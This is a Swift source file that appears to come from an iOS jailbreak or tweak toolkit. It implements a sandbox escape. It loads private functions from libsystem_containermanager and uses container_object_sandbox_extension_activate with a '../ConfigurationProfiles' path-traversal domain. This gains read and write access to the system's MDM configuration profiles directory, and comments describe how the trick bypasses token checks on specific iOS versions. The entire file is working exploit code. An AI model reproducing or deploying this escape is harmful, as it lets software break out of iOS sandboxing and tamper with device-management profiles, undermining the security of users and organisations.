//
//  mdm.swift
//  mond
//
//  MDM sandbox escape using container_object_sandbox_extension_activate
//  + container_query_operation_set_part_domain to target ConfigurationProfiles.
//
//  Root cause of original -4: bad_query uses copy_sandbox_token which iOS 26.5/26.6
//  refuses for configurationprofiles. We use container_object_sandbox_extension_activate
//  instead, which bypasses the token requirement.
//
//  Root cause of "directory exists but no files": set_part(3) only covers Library/Caches.
//  We must set_part_domain("../ConfigurationProfiles") to extend the sandbox extension
//  scope to Library/ConfigurationProfiles so that opendir() is permitted there.
//

import Foundation
import XPC

private typealias mdm_create_fn   = @convention(c) () -> UnsafeMutableRawPointer?
private typealias mdm_activate_fn = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Bool
private typealias mdm_free_fn     = @convention(c) (UnsafeMutableRawPointer?) -> Void
private typealias mdm_u64_fn      = @convention(c) (UnsafeMutableRawPointer?, UInt64) -> Void
private typealias mdm_bool_fn     = @convention(c) (UnsafeMutableRawPointer?, Bool) -> Void
private typealias mdm_obj_fn      = @convention(c) (UnsafeMutableRawPointer?, (any OS_xpc_object)?) -> Void
private typealias mdm_str_fn      = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>?) -> Void
private typealias mdm_res_fn      = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
private typealias mdm_path_fn     = @convention(c) (UnsafeMutableRawPointer?) -> UnsafePointer<CChar>?

private func mdm_sym<T>(_ h: UnsafeMutableRawPointer, _ name: String, as: T.Type) -> T? {
    guard let s = dlsym(h, name) else { print("(mdm) missing: \(name)"); return nil }
    return unsafeBitCast(s, to: T.self)
}

/// Activate a sandbox extension for the ConfigurationProfiles directory.
/// On success, returns the absolute path to the ConfigurationProfiles directory
/// that is now accessible for reading and writing.
/// Returns nil on failure.
func grant_mdm_access() -> String? {
    guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else {
        print("(mdm) dlopen failed")
        return nil
    }
    defer { dlclose(lib) }

    guard
        let create     = mdm_sym(lib, "container_query_create",                     as: mdm_create_fn.self),
        let activate   = mdm_sym(lib, "container_object_sandbox_extension_activate", as: mdm_activate_fn.self),
        let free       = mdm_sym(lib, "container_query_free",                        as: mdm_free_fn.self),
        let set_cls    = mdm_sym(lib, "container_query_set_class",                   as: mdm_u64_fn.self),
        let set_tran   = mdm_sym(lib, "container_query_set_transient",               as: mdm_bool_fn.self),
        let set_gids   = mdm_sym(lib, "container_query_set_group_identifiers",       as: mdm_obj_fn.self),
        let set_plat   = mdm_sym(lib, "container_query_operation_set_platform",      as: mdm_u64_fn.self),
        let set_flag   = mdm_sym(lib, "container_query_operation_set_flags",         as: mdm_u64_fn.self),
        let set_part   = mdm_sym(lib, "container_query_operation_set_part",          as: mdm_u64_fn.self),
        let set_domain = mdm_sym(lib, "container_query_operation_set_part_domain",   as: mdm_str_fn.self),
        let get_res    = mdm_sym(lib, "container_query_get_single_result",           as: mdm_res_fn.self),
        let get_path   = mdm_sym(lib, "container_object_get_path",                  as: mdm_path_fn.self)
    else { return nil }

    guard let q = create() else {
        print("(mdm) container_query_create returned nil")
        return nil
    }

    // Class 13 = SystemGroup
    set_cls(q, 13)
    set_tran(q, false)

    let arr = xpc_array_create(nil, 0)
    xpc_array_set_string(arr, XPC_ARRAY_APPEND, "systemgroup.com.apple.configurationprofiles")
    set_gids(q, arr)

    set_plat(q, 2)
    set_flag(q, (1 << 32) | (1 << 39))

    // Part 3 = Library/Caches (base anchor)
    set_part(q, 3)

    // KEY FIX: set_part_domain redirects the sandbox extension scope.
    // "../ConfigurationProfiles" = go up from Library/Caches → Library,
    // then into ConfigurationProfiles. This gives opendir/read/write access
    // to Library/ConfigurationProfiles instead of just Library/Caches.
    set_domain(q, "../ConfigurationProfiles")

    guard let res = get_res(q) else {
        free(q)
        print("(mdm) container_query_get_single_result returned nil")
        return nil
    }

    guard activate(res, true) else {
        free(q)
        print("(mdm) container_object_sandbox_extension_activate returned false")
        return nil
    }

    // get_path returns the actual path the extension was activated for
    let activatedPath: String
    if let c_path = get_path(res) {
        activatedPath = String(cString: c_path)
    } else {
        // Fallback: use the known hardcoded path since activate() succeeded
        activatedPath = TweakPaths.mdm_profiles
    }

    free(q)
    print("(mdm) sandbox extension activated, path: \(activatedPath)")
    return activatedPath
}
